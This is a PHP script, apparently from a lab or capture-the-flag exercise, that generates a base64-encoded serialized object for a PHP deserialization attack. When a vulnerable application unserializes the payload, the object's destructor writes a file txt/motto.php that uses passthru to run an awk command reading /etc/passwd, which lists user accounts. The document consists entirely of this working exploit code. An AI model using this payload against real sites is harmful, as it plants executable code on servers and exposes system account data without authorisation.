<?php

class pageContent{
  private $file_name;
  private $newContent;

  function __construct() 
  {   
   $command="awk -F'[/:]' '{if ($3 >= 1000 && $3 != 65534) print $1}' /etc/passwd";
   $begin="<?php passthru(";
   $end=");?>";
   $this->file_name="txt/motto.php";
   $this->newContent=$begin.'"'.$command.'"'.$end;
  } 

  function setContent($newContent){
    $this->newContent=$newContent;
  }

  function __destruct() 
  { 
    $fd=fopen($this->file_name,"w");
    fwrite($fd,$this->newContent);
    fclose($fd);
  } 
}

$o = new pageContent();
print base64_encode(serialize($o))."\n";

?>
